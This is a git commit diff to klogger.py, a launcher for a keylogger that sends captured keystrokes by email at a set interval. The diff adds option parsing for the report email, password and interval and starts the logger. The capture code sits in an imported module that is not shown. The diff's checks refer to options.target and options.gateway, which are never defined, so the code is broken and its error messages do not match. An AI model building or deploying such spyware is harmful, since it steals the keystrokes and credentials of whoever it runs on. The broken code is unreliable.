d309b6bef06d2c0f1d4eb08822aed9e3c93cf9a1
Kevin Cochrane <kevin.cochrane@gmail.com>
2022-09-02 18:19:48 +0200

    Removing info that shouldn't be included.

--- klogger.py
+++ klogger.py
@@ -1,5 +1,26 @@
 #!/usr/bin/env python
 import keylogger
+import optparse
 
-my_keylogger = keylogger.Keylogger(120, "emailhere", "paseswordhere")
-#my_keylogger.start()
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-e", "--email", dest="email", help="The email address you want the reports to be sent to.")
+    parser.add_option("-p", "--password", dest="password", help="The password for your email address.")
+    parser.add_option("-i", "--interval", dest="interval", help="The time interval you want to use. Eg. 120 will send a log update every 2 minutes")
+    (options, arguments) = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify an email address to send reports to, use --help for more info")
+    elif not options.gateway:
+        parser.error("[-] Please specify the time interval you want to use for reports, use --help for more info")
+    return options
+
+
+options = get_arguments()
+email = options.email
+password = options.password
+interval = options.interval
+
+
+my_keylogger = keylogger.Keylogger(interval, email, password)
+
